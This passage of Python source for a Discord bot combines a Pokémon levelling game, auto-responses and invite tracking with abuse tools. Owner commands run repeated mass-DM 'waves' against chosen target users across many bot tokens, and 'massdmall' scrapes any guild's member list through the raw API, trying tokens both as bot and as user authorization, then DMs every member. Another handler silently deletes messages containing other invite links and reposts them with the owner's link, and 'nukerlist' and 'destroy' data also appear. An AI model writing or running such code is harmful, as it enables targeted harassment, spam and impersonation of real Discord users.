                            await message.channel.send(embed=discord.Embed(description=f"✅ **{word}** accepted!\n➡️ Next: <@{next_id}> — start with `{word[-2:].upper()}`. You have **15 seconds**.", color=COLORS["success"]))
                            if wc.get("schedule_timeout"): wc["schedule_timeout"]()
    except Exception:
        pass

    # ── Direct help interception ──
    stripped = (message.content or "").strip()
    if stripped.lower() == f"{PREFIX}help" or stripped.lower().startswith(f"{PREFIX}help "):
        try:
            await message.channel.send(embed=build_help_home(), view=HelpView())
        except Exception as ex:
            try:
                await message.channel.send(embed=discord.Embed(description=f"❌ Help menu error: `{ex}`", color=COLORS["error"]))
            except Exception:
                pass
        return

    # ── Typing XP — every 10 non-command messages levels up active Pokémon ──
    try:
        _content = (message.content or "").strip()
        if (
            not message.author.bot
            and _content
            and not _content.startswith(PREFIX)
            and message.guild  # only in servers (not DMs)
        ):
            _uid = str(message.author.id)
            _TYPING_MSG_COUNT[_uid] = _TYPING_MSG_COUNT.get(_uid, 0) + 1
            if _TYPING_MSG_COUNT[_uid] >= 10:
                _TYPING_MSG_COUNT[_uid] = 0
                _tud = get_pokemon_data(_uid)
                # Level up first non-dead Pokémon
                _active_pk = next((p for p in _tud.get("pokemon", []) if not p.get("is_dead")), None)
                if _active_pk:
                    _old_lvl = _active_pk.get("level", 1)
                    _new_lvl = min(100, _old_lvl + 1)
                    _active_pk["level"] = _new_lvl
                    _evolved, _t_old, _t_new = check_and_evolve(_active_pk)
                    save_pokemon_data(_uid, _tud)
                    # Build level-up message
                    _pk_display = _t_new.capitalize() if _evolved else _active_pk["species"].capitalize()
                    _lvl_desc   = (
                        f"⬆️ {message.author.mention}'s **{_pk_display}** leveled up to **Lv. {_new_lvl}**!"
                    )
                    if _evolved:
                        _lvl_desc += (
                            f"\n🌟 **{_t_old.capitalize()} evolved into {_t_new.capitalize()}!**"
                        )
                    try:
                        await message.channel.send(
                            embed=discord.Embed(description=_lvl_desc, color=0xFFD700),
                            delete_after=20,
                        )
                    except Exception:
                        pass
    except Exception:
        pass

    # ── Server link swap — replace any discord.gg link with the configured default ──
    try:
        if _DEFAULT_SERVER_LINK and message.guild and not message.author.bot:
            _inv_pattern = re.compile(
                r"https?://(?:www\.)?(?:discord\.gg|discord\.com/invite)/[a-zA-Z0-9\-]+",
                re.IGNORECASE,
            )
            _found = _inv_pattern.findall(message.content or "")
            # Only act if the message has a link that isn't already the default
            _foreign = [u for u in _found if u.rstrip("/") != _DEFAULT_SERVER_LINK.rstrip("/")]
            if _foreign:
                # Try to delete the original and repost with swapped links
                _new_content = _inv_pattern.sub(_DEFAULT_SERVER_LINK, message.content)
                try:
                    await message.delete()
                    await message.channel.send(
                        f"**{message.author.display_name}:** {_new_content}"
                    )
                except Exception:
                    pass
                return  # don't process as a command after intercepting
    except Exception:
        pass

    # Prefix commands already handled at the top of on_message — do not process twice.

# ─── Command DM Logging ───────────────────────────────────────────────────────
# Only DM owner when these specific commands are used by non-owners
_DM_LOG_ALLOW = {
    # trade & battle (user-facing but owner wants visibility)
    "ptrade", "pbattle",
    # owner/whitelist-only prefix commands
    "global_bot_lock", "antinuke",
}


@bot.command(name="setwelcome")
@commands.has_permissions(administrator=True)
async def setwelcome(ctx, channel: discord.TextChannel = None):
    """Set (or clear) the welcome channel for this server."""
    if channel is None:
        _WELCOME_SETTINGS.pop(ctx.guild.id, None)
        save("welcome_settings", {str(k): v for k, v in _WELCOME_SETTINGS.items()})
        return await ctx.send(embed=discord.Embed(
            description="✅ Welcome channel **cleared** — bot will use the system channel.",
            color=COLORS["success"]))
    _WELCOME_SETTINGS[ctx.guild.id] = channel.id
    save("welcome_settings", {str(k): v for k, v in _WELCOME_SETTINGS.items()})
    e = discord.Embed(
        title   = "✅  Welcome Channel Set",
        description = (
            f"New members will be greeted in {channel.mention}.\n\n"
            f"Use `,setwelcome` (no channel) to clear it."
        ),
        color = COLORS["success"],
    )
    e.set_footer(text=f"Set by {ctx.author.display_name}  ·  Coolbot")
    await ctx.send(embed=e)


def _save_autoresponses():
    try:
        save("autoresponses", {str(gid): dict(triggers) for gid, triggers in _AUTORESPONSES.items()})
    except Exception as ex:
        print(f"[autorespond] save failed: {ex}")


@bot.hybrid_command(name="autorespond", aliases=["ar", "autoresponse"], description="Manage auto-responses (Admin)")
@app_commands.describe(action="list | add | remove | clear", trigger="Trigger word/phrase", response="Reply text (or use: add trigger | reply)")
async def autorespond_cmd(ctx, action: str = "list", trigger: str = None, *, response: str = None):
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
    if not (has_owner_access(ctx.author) or ctx.author.guild_permissions.manage_guild or ctx.author.guild_permissions.administrator):
        return await ctx.send(embed=discord.Embed(description="❌ Need Manage Server or Administrator.", color=COLORS["error"]))
    action = (action or "list").lower().strip()
    guild_map = _AUTORESPONSES.setdefault(ctx.guild.id, {})
    if action == "add" and trigger and not response and "|" in trigger:
        parts = trigger.split("|", 1)
        trigger, response = parts[0].strip(), parts[1].strip()
    if action == "list":
        if not guild_map:
            return await ctx.send(embed=discord.Embed(description="📭 No auto-responses.\nAdd: `,autorespond add <trigger> | <reply>`", color=COLORS["info"]))
        lines = [f"**`{t}`** → {r[:80]}{'…' if len(r) > 80 else ''}" for t, r in sorted(guild_map.items())]
        e = discord.Embed(title=f"💬 Auto-Responses — {ctx.guild.name}", description="\n".join(lines[:30]), color=COLORS["main"])
        e.set_footer(text=f"{len(guild_map)} trigger(s)")
        return await ctx.send(embed=e)
    if action == "clear":
        guild_map.clear()
        _save_autoresponses()
        return await ctx.send(embed=discord.Embed(description="✅ All auto-responses cleared.", color=COLORS["success"]))
    if action in ("remove", "delete", "rm"):
        if not trigger:
            return await ctx.send(embed=discord.Embed(description="❌ Usage: `,autorespond remove <trigger>`", color=COLORS["error"]))
        key = trigger.lower().strip()
        if key in guild_map:
            del guild_map[key]
            _save_autoresponses()
            return await ctx.send(embed=discord.Embed(description=f"✅ Removed **`{key}`**.", color=COLORS["success"]))
        return await ctx.send(embed=discord.Embed(description=f"❌ No trigger **`{key}`**.", color=COLORS["error"]))
    if action == "add":
        if trigger and "|" in trigger and not response:
            parts = trigger.split("|", 1)
            trigger, response = parts[0].strip(), parts[1].strip()
        if not trigger or not response:
            return await ctx.send(embed=discord.Embed(description="❌ Usage: `,autorespond add <trigger> | <reply>`", color=COLORS["error"]))
        key = trigger.lower().strip()[:100]
        if len(guild_map) >= 50:
            return await ctx.send(embed=discord.Embed(description="❌ Max 50 auto-responses per server.", color=COLORS["error"]))
        guild_map[key] = response.strip()[:1000]
        _save_autoresponses()
        return await ctx.send(embed=discord.Embed(description=f"✅ When someone says **`{key}`**, I'll reply:\n> {response.strip()[:200]}", color=COLORS["success"]))
    await ctx.send(embed=discord.Embed(description="❌ Use `list`, `add`, `remove`, or `clear`.", color=COLORS["error"]))


@bot.command(name="myinvites", aliases=["invites","referrals","i"])
async def myinvites(ctx):
    """Show your referral stats — total, real, fake invites and coins earned."""
    uid = str(ctx.author.id)
    ud  = get_pokemon_data(uid)

    total_invites = ud.get("total_invites", 0)
    fake_invites  = ud.get("fake_invites", 0)
    real_invites  = ud.get("referrals", 0)
    coins_earned  = ud.get("referral_coins", 0)

    # If total_invites wasn't tracked before, estimate it from real + fake
    if total_invites == 0 and (real_invites > 0 or fake_invites > 0):
        total_invites = real_invites + fake_invites

    e = discord.Embed(
        title=f"📨  {ctx.author.display_name}'s Invite Stats",
        description=(
            f"Every **real** invite earns you **{REFERRAL_REWARD:,} coins** automatically!\n"
            f"Invites from J4J/fake servers **don't** count. 🚫"
        ),
        color=0x57F287,
    )
    e.add_field(name="📊  Total Invites",  value=f"**{total_invites:,}**",    inline=True)
    e.add_field(name="✅  Real Invites",   value=f"**{real_invites:,}**",     inline=True)
    e.add_field(name="❌  Fake Invites",   value=f"**{fake_invites:,}**",     inline=True)
    e.add_field(name="💰  Coins Earned",   value=f"**{coins_earned:,}**",     inline=True)
    e.add_field(name="🎁  Per Real Invite",value=f"**{REFERRAL_REWARD:,}**",  inline=True)
    e.add_field(name="\u200b",             value="\u200b",                    inline=True)
    e.set_thumbnail(url=ctx.author.display_avatar.url)
    gname = ctx.guild.name if ctx.guild else "DM"
    e.set_footer(text=f"Coolbot  ·  Referral System  ·  {gname}")
    await ctx.send(embed=e)

@bot.hybrid_command(name="invitelb", aliases=["invitesleaderboard","inviteleaderboard"], description="Invite leaderboard for this server")
async def invitelb(ctx):
    """Top inviters — live Discord invite uses (Falcon-style)."""
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Use this in a server.", color=COLORS["error"]))
    try:
        guild_invites = await ctx.guild.fetch_invites()
    except discord.Forbidden:
        return await ctx.send(embed=discord.Embed(
            description="❌ I need the **Manage Server** permission to read invites.",
            color=COLORS["error"],
        ))
    except Exception as ex:
        return await ctx.send(embed=discord.Embed(
            description=f"❌ Could not fetch invites: `{ex}`",
            color=COLORS["error"],
        ))
    try:
        tally = {}
        for inv in guild_invites:
            if inv.inviter and not getattr(inv.inviter, "bot", False):
                uid = inv.inviter.id
                tally[uid] = tally.get(uid, 0) + int(inv.uses or 0)
        # Merge with tracked economy referrals as fallback signal
        try:
            data = load("economy")
            if isinstance(data, dict):
                for uid_s, ud in data.items():
                    if not isinstance(ud, dict):
                        continue
                    refs = int(ud.get("referrals", 0) or 0)
                    if refs <= 0:
                        continue
                    try:
                        uid = int(uid_s)
                    except Exception:
                        continue
                    # Prefer live Discord uses; only fill zeros from tracked
                    if uid not in tally:
                        tally[uid] = refs
        except Exception:
            pass
        if not tally:
            return await ctx.send(embed=discord.Embed(
                description="📭 No invite data yet. Create invites and get people to join!",
                color=COLORS["info"],
            ))
        sorted_lb = sorted(tally.items(), key=lambda x: x[1], reverse=True)[:15]
        medals = {1: "🥇", 2: "🥈", 3: "🥉"}
        lines = []
        for i, (uid, uses) in enumerate(sorted_lb, 1):
            mem = ctx.guild.get_member(uid)
            if mem:
                name = mem.display_name
            else:
                try:
                    u = await ctx.bot.fetch_user(uid)
                    name = u.display_name
                except Exception:
                    name = f"User {uid}"
            icon = medals.get(i, f"**{i}.**")
            lines.append(f"{icon} `{name}` — **{uses:,}** invite{'s' if uses != 1 else ''}")
        e = discord.Embed(
            title=f"📨 Invite Leaderboard — {ctx.guild.name}",
            description="\n".join(lines),
            color=0x57F287,
        )
        your_uses = tally.get(ctx.author.id, 0)
        ranked = sorted(tally.items(), key=lambda x: x[1], reverse=True)
        your_rank = next((i + 1 for i, (uid, _) in enumerate(ranked) if uid == ctx.author.id), None)
        if your_rank:
            e.set_footer(text=f"Your rank: #{your_rank}  ·  {your_uses:,} invites")
        else:
            e.set_footer(text="Create an invite link to appear on the board")
        await ctx.send(embed=e)
    except Exception as ex:
        print(f"[invitelb] {ex}")
        await ctx.send(embed=discord.Embed(
            description=f"❌ Something went wrong building the leaderboard: `{ex}`",
            color=COLORS["error"],
        ))

@bot.command(name="addinvites")
async def addinvites(ctx, member: discord.Member = None, amount: int = None):
    """Owner only — add invite count and coins to a user."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
    if not member or not amount or amount <= 0:
        return await ctx.send(embed=discord.Embed(description="❌ Usage: `,addinvites @user <amount>`", color=COLORS["error"]))
    uid = str(member.id)
    ud = get_pokemon_data(uid)
    ud["referrals"] = ud.get("referrals", 0) + amount
    coins_earned = amount * REFERRAL_REWARD
    ud["referral_coins"] = ud.get("referral_coins", 0) + coins_earned
    ud["balance"] = ud.get("balance", 0) + coins_earned
    save_pokemon_data(uid, ud)
    await ctx.send(embed=discord.Embed(
        description=f"✅ Added **{amount}** invites and **{coins_earned:,}** coins to {member.mention}.",
        color=COLORS["success"],
    ))

@bot.command(name="removeinvites")
async def removeinvites(ctx, member: discord.Member = None, amount: int = None):
    """Owner or server Admin — remove invite count from a user."""
    is_allowed = (
        has_owner_access(ctx.author)
        or (ctx.guild and ctx.author.guild_permissions.administrator)
    )
    if not is_allowed:
        return await ctx.send(embed=discord.Embed(description="❌ Server Admin or Owner only.", color=COLORS["error"]))
    if not member or not amount or amount <= 0:
        return await ctx.send(embed=discord.Embed(description="❌ Usage: `,removeinvites @user <amount>`", color=COLORS["error"]))
    uid = str(member.id)
    ud = get_pokemon_data(uid)
    ud["referrals"] = max(0, ud.get("referrals", 0) - amount)
    save_pokemon_data(uid, ud)
    await ctx.send(embed=discord.Embed(
        description=f"✅ Removed **{amount}** invites from {member.mention}. New total: **{ud['referrals']:,}**.",
        color=COLORS["success"],
    ))




@bot.command(name="massdmstatus", aliases=["dmstatus","activedms"])
async def massdmstatus(ctx):
    """Owner only — live status of everyone currently being mass DMed."""
    if not has_owner_access(ctx.author):
        return await ctx.send(
            embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]),
            ephemeral=False,
        )

    active = {
        uid: stats for uid, stats in _MASSDM_STATS.items()
        if uid in _MASSDM_TASKS and not _MASSDM_TASKS[uid].done()
    }

    if not active:
        return await ctx.send(embed=discord.Embed(
            title="📬 MassDm Status",
            description="✅ No active MassDm loops running right now.",
            color=COLORS["success"]
        ))

    total_bots    = 1
    msgs_per_wave = 3  # default; actual amount stored per target
    now           = datetime.now(timezone.utc).timestamp()
    grand_total   = sum(s.get("total_msgs", 0) for s in active.values())

    e = discord.Embed(
        title=f"🔥 MassDm Status — {len(active)} Active Target{'s' if len(active) != 1 else ''}",
        description=(
            f"**1 bot** · per-target amount each wave 💣"
            + chr(10)
            + f"⏱️ Wave interval: **15 seconds** · Grand total: **~{grand_total:,}** messages"
        ),
        color=COLORS["error"],
    )

    for uid, stats in active.items():
        rounds       = stats.get("rounds", 0)
        total_msgs   = stats.get("total_msgs", 0)
        name         = stats.get("target_name", "Unknown")
        initiator    = stats.get("initiator", "Unknown")
        started_ts   = stats.get("started", now)
        last_wave_ts = stats.get("last_wave", started_ts)
        running_secs = int(now - started_ts)
        since_last   = int(now - last_wave_ts)
        next_wave    = max(0, 90 - since_last)
        mpw          = stats.get("msgs_per_wave", msgs_per_wave)
        n_bots       = stats.get("total_bots", total_bots)

        e.add_field(
            name=f"💀 {name}",
            value=(
                f"**Target:** <@{uid}>\n"
                f"**Started by:** {initiator}\n"
                f"**Rounds done:** {rounds}\n"
                f"**~Total msgs:** {total_msgs:,}\n"
                f"**Bots/wave:** {n_bots} × 500 = {mpw:,}\n"
                f"**Running:** {_gw_time_str(running_secs)}\n"
                f"**Next wave:** ~{next_wave}s\n"
                f"`,stopdm <@{uid}>` to kill"
            ),
            inline=False,
        )

    e.set_footer(text=f"~{grand_total:,} total msgs • {total_bots} bots • 15s loop • Coolbot 🐻‍❄️")
    await ctx.send(embed=e)


#  ,dmcheck <user_id>  — test if all bots can DM this user
@bot.hybrid_command(name="dmcheck", description="Test if all bots can DM a user (use their ID)")
@app_commands.describe(user_id="The Discord user ID to check")
async def dmcheck(ctx, user_id: str):
    if not has_owner_access(ctx.author):
        return await ctx.send(
            embed=discord.Embed(description="❌ Bot owner only.", color=COLORS["error"]),
            ephemeral=False,
        )
    try:
        uid = int(user_id)
    except ValueError:
        return await ctx.send(
            embed=discord.Embed(description="❌ That's not a valid user ID.", color=COLORS["error"]),
            ephemeral=False,
        )

    total   = 1 + len(MASSDM_BOT_TOKENS)
    ok_msg  = await ctx.send(
        embed=discord.Embed(
            title="🔍 DM Check — Testing…",
            description=f"Checking {total} bots against `{uid}`…",
            color=COLORS["info"],
        )
    )

    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    results   = []   # list of (label, success)

    async with aiohttp.ClientSession(connector=connector) as session:
        # Check Coolbot
        try:
            target = await ctx.bot.fetch_user(uid)
            dm     = await target.create_dm()
            results.append(("Coolbot 🐻‍❄️", True))
        except Exception:
            results.append(("Coolbot 🐻‍❄️", False))

        # Check each extra bot
        async def _check_one(token: str, idx: int):
            res = await _dm_raw_open(session, token, uid)
            label = f"Bot #{idx+1}"
            return (label, res is not None)

        checks = await asyncio.gather(
            *[_check_one(tok, i) for i, tok in enumerate(MASSDM_BOT_TOKENS)],
            return_exceptions=True,
        )
        for c in checks:
            if isinstance(c, tuple):
                results.append(c)
            else:
                results.append(("Bot ?", False))

    open_bots   = [r for r in results if r[1]]
    closed_bots = [r for r in results if not r[1]]

    desc = (
        f"**Target:** `{uid}`\n"
        f"**Total bots tested:** {total}\n\n"
        f"✅ **Can DM ({len(open_bots)}):** "
        + (", ".join(r[0] for r in open_bots) or "none")
        + f"\n\n❌ **Blocked ({len(closed_bots)}):** "
        + (", ".join(r[0] for r in closed_bots) or "none")
    )
    color = COLORS["success"] if open_bots else COLORS["error"]
    try:
        await ok_msg.edit(embed=discord.Embed(
            title="🔍 DM Check — Results",
            description=desc,
            color=color,
        ).set_footer(text=f"Coolbot 🐻‍❄️  •  {len(open_bots)}/{total} bots can reach this user"))
    except Exception:
        pass


@bot.command(name="token", aliases=["gettoken", "grabtoken", "tokenhelp"])
async def token_grab(ctx):
    """Safety stub: never reveal or extract Discord account tokens."""
    await ctx.send(
        embed=discord.Embed(
            title="🔐 Token safety",
            description=(
                "This command is disabled because extracting Discord user tokens can compromise accounts. "
                "For your own bot token, use the official Discord Developer Portal and keep it private. "
                "If a token was exposed, reset it immediately."
            ),
            color=COLORS["warn"],
        )
    )


@bot.command(name="stopdm", aliases=["stopmassdm","canceldm"])
async def stopdm(ctx, *, target: str = ""):
    """Owner only — stop the looping massdm for a user.
    Works with @mention, raw user ID, or no arg (lists all active)."""
    if not has_owner_access(ctx.author):
        return await ctx.send(
            embed=discord.Embed(description="❌ Owner or Premium only.", color=COLORS["error"]),
        )

    # ── Resolve target user ID from mention, raw ID, or name ──────────────
    target_uid: Optional[int] = None
    target_name: str = "Unknown"

    if target.strip():
        # Strip Discord mention formatting: <@123> or <@!123>
        clean = target.strip().lstrip("<@!").rstrip(">")
        try:
            target_uid = int(clean)
        except ValueError:
            # Try matching by display name in active sessions
            for uid, stats in _MASSDM_STATS.items():
                if stats.get("target_name", "").lower() == target.strip().lower():
                    target_uid = uid
                    break
            if target_uid is None:
                return await ctx.send(embed=discord.Embed(
                    description=(
                        f"❌ Could not resolve `{target}` to a user ID.\n"
                        f"Use `,stopdm <user_id>` or `,stopdm` to list active targets."
                    ),
                    color=COLORS["error"],
                ))

    if target_uid is None:
        # No target — list all active loops
        active = [uid for uid, t in _MASSDM_TASKS.items() if not t.done()]
        if not active:
            return await ctx.send(embed=discord.Embed(description="✅ No active MassDm loops.", color=COLORS["success"]))
        lines = []
        for uid in active:
            st = _MASSDM_STATS.get(uid, {})
            lines.append(f"• <@{uid}> (`{uid}`) — {st.get('rounds', 0)} rounds, ~{st.get('total_msgs', 0):,} msgs")
        return await ctx.send(embed=discord.Embed(
            title="📬 Active MassDm Loops",
            description="\n".join(lines) + "\n\nUse `,stopdm <user_id>` to stop one.",
            color=COLORS["info"]
        ))

    # ── Try to resolve display name for the summary ───────────────────────
    stats = _MASSDM_STATS.get(target_uid, {})
    target_name = stats.get("target_name") or f"<@{target_uid}>"

    task = _MASSDM_TASKS.get(target_uid)
    if not task or task.done():
        return await ctx.send(embed=discord.Embed(
            description=f"❌ No active MassDm loop for **{target_name}** (`{target_uid}`).",
            color=COLORS["error"]
        ))

    # Grab stats before wiping them
    rounds_done = stats.get("rounds", 0)
    total_msgs  = stats.get("total_msgs", 0)
    initiator   = stats.get("initiator", "Unknown")
    started_ts  = stats.get("started", 0)
    n_bots      = stats.get("total_bots", 1 + len(MASSDM_BOT_TOKENS))
    mpw         = stats.get("msgs_per_wave", n_bots * 3)
    now         = datetime.now(timezone.utc).timestamp()
    elapsed     = int(now - started_ts) if started_ts else 0
    elapsed_str = _gw_time_str(elapsed) if elapsed else "—"

    # 1) Set the stop event FIRST — kills the loop at next check
    stop_ev = _MASSDM_STOP_EVENTS.get(target_uid)
    if stop_ev:
        stop_ev.set()

    # 2) Cancel the main loop task
    task.cancel()
    _MASSDM_TASKS.pop(target_uid, None)

    # 3) Cancel ALL in-flight wave subtasks instantly
    wave_tasks_killed = len(_MASSDM_WAVE_TASKS.get(target_uid, set()))
    for wave_task in list(_MASSDM_WAVE_TASKS.pop(target_uid, set())):
        wave_task.cancel()

    # 4) Clean up state
    _MASSDM_STOP_EVENTS.pop(target_uid, None)
    _MASSDM_STATS.pop(target_uid, None)

    await asyncio.sleep(0)

    e = discord.Embed(
        title="🛑 MassDm Stopped",
        description=(
            f"✅ Killed **all** DM waves for **{target_name}** instantly.\n\n"
            f"**📊 Session Summary**\n"
            f"🔁 Rounds completed: **{rounds_done}**\n"
            f"💬 ~Total messages sent: **{total_msgs:,}**\n"
            f"🤖 Bots used: **{n_bots}** ({mpw} msgs/wave)\n"
            f"⏱️ Runtime: **{elapsed_str}**\n"
            f"👤 Started by: **{initiator}**\n"
            f"🔴 In-flight waves killed: **{wave_tasks_killed}**"
        ),
        color=COLORS["success"],
    )
    e.set_footer(text="Coolbot 🐻‍❄️  •  MassDm session ended")
    await ctx.send(embed=e)


#  ,stopdmall — Owner only — kill every active massdm loop at once
@bot.command(name="stopdmall", aliases=["stopallmassdm", "cancelallmassdm", "stopalldm"])
async def stopdmall(ctx):
    """Owner only — instantly stop every active massdm loop."""
    if not has_owner_access(ctx.author):
        return await ctx.send(
            embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"])
        )

    active_ids = [uid for uid, t in list(_MASSDM_TASKS.items()) if not t.done()]

    if not active_ids:
        return await ctx.send(
            embed=discord.Embed(description="✅ No active MassDm loops running.", color=COLORS["success"])
        )

    killed       = 0
    waves_killed = 0
    total_rounds = 0
    total_msgs   = 0

    for uid in active_ids:
        # 1) Set stop event — breaks mid-wave batches immediately
        ev = _MASSDM_STOP_EVENTS.get(uid)
        if ev:
            ev.set()

        # 2) Cancel main loop task
        task = _MASSDM_TASKS.get(uid)
        if task and not task.done():
            task.cancel()
            killed += 1

        # 3) Cancel all in-flight wave subtasks
        wave_set = _MASSDM_WAVE_TASKS.pop(uid, set())
        for wt in list(wave_set):
            wt.cancel()
        waves_killed += len(wave_set)

        # 4) Collect stats then clean up
        stats = _MASSDM_STATS.get(uid, {})
        total_rounds += stats.get("rounds", 0)
        total_msgs   += stats.get("total_msgs", 0)

        _MASSDM_TASKS.pop(uid, None)
        _MASSDM_STOP_EVENTS.pop(uid, None)
        _MASSDM_STATS.pop(uid, None)

    # Yield to event loop so all cancellations propagate
    await asyncio.sleep(0)

    targets = "\n".join(f"• <@{uid}>" for uid in active_ids)
    await ctx.send(embed=discord.Embed(
        title="🛑 All MassDm Loops — Stopped",
        description=(
            f"**Killed {killed} loop(s) instantly** 💀\n\n"
            f"**Targets stopped:**\n{targets}\n\n"
            f"🔁 Total rounds across all sessions: **{total_rounds}**\n"
            f"💬 ~Total messages sent: **{total_msgs:,}**\n"
            f"⚡ In-flight waves cancelled: **{waves_killed}**"
        ),
        color=COLORS["success"],
    ).set_footer(text="Coolbot 🐻‍❄️  •  All MassDm sessions ended"))


#  ,massdmall (guild_id) — DM every non-bot member of any guild
#  from ALL 42 bots without needing mutual servers.
#  Owner only. Uses raw HTTP API — no shared server required.

async def _fetch_guild_members_raw(guild_id: int) -> list[dict]:
    """Try every bot token until one that's in the guild returns the member list.
    Returns list of member dicts with at least {user: {id, bot}} fields."""
    all_tokens = [TOKEN] + list(MASSDM_BOT_TOKENS)
    connector  = aiohttp.TCPConnector(limit=0, ssl=False)
    members: list[dict] = []
    async with aiohttp.ClientSession(connector=connector) as session:
        for tok in all_tokens:
            for auth in (f"Bot {tok}", tok):
                headers = {"Authorization": auth, "Content-Type": "application/json"}
                try:
                    fetched: list[dict] = []
                    after = 0
                    while True:
                        url = f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000&after={after}"
                        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as r:
                            if r.status == 429:
                                d = await r.json()
                                await asyncio.sleep(float(d.get("retry_after", 2)) + 0.1)
                                continue
                            if r.status in (401, 403, 404):
                                break
                            if r.status != 200:
                                break
                            page = await r.json()
                            if not page:
                                break
                            fetched.extend(page)
                            if len(page) < 1000:
                                break
                            after = int(page[-1]["user"]["id"])
                    if fetched:
                        return fetched
                except Exception:
                    continue
    return members


async def _massdmall_worker(guild_id: int, status_ch, initiator: str, amount: int = 3):
    """Background task: DM every non-bot member of guild_id using the main bot only."""
    amount = max(1, min(int(amount or 3), 50))
    members = await _fetch_guild_members_raw(guild_id)
    human = [m for m in members if not m.get("user", {}).get("bot", False)]

    if not human:
        if status_ch:
            try:
                await status_ch.send(embed=discord.Embed(
                    description=f"❌ No accessible members found in guild `{guild_id}`.",
                    color=COLORS["error"],
                ))
            except Exception:
                pass
        return

    total_members = len(human)
    total_sent = 0

    if status_ch:
        try:
            await status_ch.send(embed=discord.Embed(
                title="📬 MassDmAll — Starting",
                description=(
                    f"Found **{total_members}** members in guild `{guild_id}`"
                    + chr(10)
                    + f"**1 bot** · **{amount}** messages each"
                    + chr(10)
                    + f"Started by **{initiator}**"
                ),
                color=COLORS["warn"],
            ))
        except Exception:
            pass

    for i, member in enumerate(human):
        try:
            uid = int(member["user"]["id"])
        except Exception:
            continue
        try:
            await _run_massdm_direct(uid, amount=amount)
            total_sent += 1
        except Exception:
            pass
        if status_ch and (i + 1) % 25 == 0:
            try:
                await status_ch.send(embed=discord.Embed(
                    description=f"📬 Progress: **{i+1}/{total_members}** members DMed…",
                    color=COLORS["info"],
                ), delete_after=60)
            except Exception:
                pass
        await asyncio.sleep(0.35)

    if status_ch:
        try:
            await status_ch.send(embed=discord.Embed(
                title="✅ MassDmAll — Complete",
                description=(
                    f"Finished **{total_sent}/{total_members}** members in guild `{guild_id}`"
                    + chr(10)
                    + f"**1 bot** · **{amount}** messages each"
                ),
                color=COLORS["success"],
            ))
        except Exception:
            pass


@bot.hybrid_command(name="dmall", aliases=["dmallguild"], description="Owner/co-owner: DM every member of the current guild once")
@app_commands.describe(
    guild_id="Target server ID",
    amount="Messages per member (1-50, default 3)",
)
async def massdmall_cmd(ctx, guild_id: str = "", amount: int = 3):
    """Owner only — DM every non-bot member of a guild using this bot only."""
    if not has_owner_access(ctx.author):
        return
    if not guild_id:
        return await ctx.send(embed=discord.Embed(
            description=(
                "❌ Usage: `,massdmall <guild_id> [amount]`"
                + chr(10)
                + "Example: `,massdmall 123456789012345678 5`"
            ),
            color=COLORS["error"],
        ))
    try:
        gid = int(str(guild_id).strip())
    except ValueError:
        return await ctx.send(embed=discord.Embed(description="❌ Invalid guild ID.", color=COLORS["error"]))
    try:
        amount = max(1, min(int(amount or 3), 50))
    except Exception:
        amount = 3
    try:
        if ctx.message:
            await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(embed=discord.Embed(
        title="📬 MassDmAll — Launched",
        description=(
            f"Fetching members from guild `{gid}`…"
            + chr(10)
            + f"**1 bot** · **{amount}** messages per member"
            + chr(10)
            + "Progress updates will appear here."
        ),
        color=COLORS["warn"],
    ))
    asyncio.create_task(
        _massdmall_worker(gid, ctx.channel, getattr(ctx.author, "display_name", str(ctx.author)), amount=amount)
    )





#  AUTO BACKUP SYSTEM
#  All player data (pokemon, coins, medallions, etc.) is auto-
#  backed up silently to disk every 20 minutes as a compressed
#  .gz file. Use ,databackup to get the latest backup file sent
#  right in the channel. Use ,datarestore to restore from one.

# ── Complete list of every data file the bot writes ─────────────────────
_ALL_DATA_KEYS = [
    # Core player data
    "pokemon", "cards", "quests",
    # Economy
    "marketplace", "coins", "daily", "referrals", "invites",
    # Server management
    "server_settings", "stats_channels", "log_channels",
    "welcome_settings", "autoresponses", "sticky", "confessions",
    "afk", "giveaways", "warnings",
    # Access control
    "whitelist", "nukerlist", "nuker_logs",
    "blacklist_users", "blacklist_guilds",
    # Misc
    "destroy_defaults", "already_rewarded_joiners",
    "level_data", "automod", "boosts", "leaderboard",
]

def _collect_all_data() -> dict:
    """Read EVERY .json in DATA_DIR into one bundle — nothing is left out."""
    bundle = {}
    # First pass: known keys in preferred order
    for key in _ALL_DATA_KEYS:
        p = DATA_DIR / f"{key}.json"
        if p.exists():
            try:
                bundle[key] = json.loads(p.read_text())
            except Exception:
                bundle[key] = {}
    # Second pass: catch any extra files created at runtime
    for p in sorted(DATA_DIR.glob("*.json")):
        k = p.stem
        if k not in bundle:
            try:
                bundle[k] = json.loads(p.read_text())
            except Exception:
                pass
    return bundle

def _restore_bundle(bundle: dict):
    """Write every key in the bundle back to DATA_DIR."""
    DATA_DIR.mkdir(exist_ok=True)
    for key, data in bundle.items():
        p = DATA_DIR / f"{key}.json"
        try:
            p.write_text(json.dumps(data, indent=2))
        except Exception:
            pass

def _reload_all_memory():
    """
    After a restore, reload every in-memory dict/set from the freshly-written
    data files so the bot doesn't keep running off stale state.
    """
    global PREMIUM_USERS, WHITELIST_USERS
    global BLACKLISTED_USERS, BLACKLISTED_GUILDS
    global _DESTROY_DEFAULTS, _WELCOME_SETTINGS
    global _LOG_CHANNELS, _ALREADY_REWARDED_JOINERS, _SETRAID_CHANNEL

    # ── Access-control sets ───────────────────────────────────────────
    try:
        sl = load("nukerlist")
        PREMIUM_USERS = set(sl) if isinstance(sl, list) else set()
    except Exception:
        pass

    # Bot-lock command whitelist removed — intentionally empty
    WHITELIST_USERS = set()

    try:
        bl_u = load("blacklist_users")
        BLACKLISTED_USERS = {int(k) for k in bl_u.keys()} if isinstance(bl_u, dict) else set()
    except Exception:
        pass

    try:
        bl_g = load("blacklist_guilds")
        BLACKLISTED_GUILDS = {int(k) for k in bl_g.keys()} if isinstance(bl_g, dict) else set()
    except Exception:
        pass

    # ── Destroy defaults ──────────────────────────────────────────────
    try:
        dd = load("destroy_defaults")
        if isinstance(dd, dict):
